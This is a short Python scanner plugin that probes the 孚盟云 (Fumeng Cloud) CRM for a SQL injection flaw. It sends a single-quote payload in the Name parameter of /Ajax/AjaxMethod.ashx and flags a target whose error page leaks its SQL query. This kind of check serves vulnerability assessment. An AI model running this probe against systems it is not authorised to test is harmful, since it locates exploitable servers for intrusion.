#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/3DgwoYONc054Ax-AXODL2g',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '孚盟云 SQL注入',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/Ajax/AjaxMethod.ashx?action=getEmpByname&Name=1%27'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 500 and re.search(r'SELECT.*?count.*?FROM.*?bfEMP.*?WHERE.?upper.*?LoginUser.*?',res.text,re.S):
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret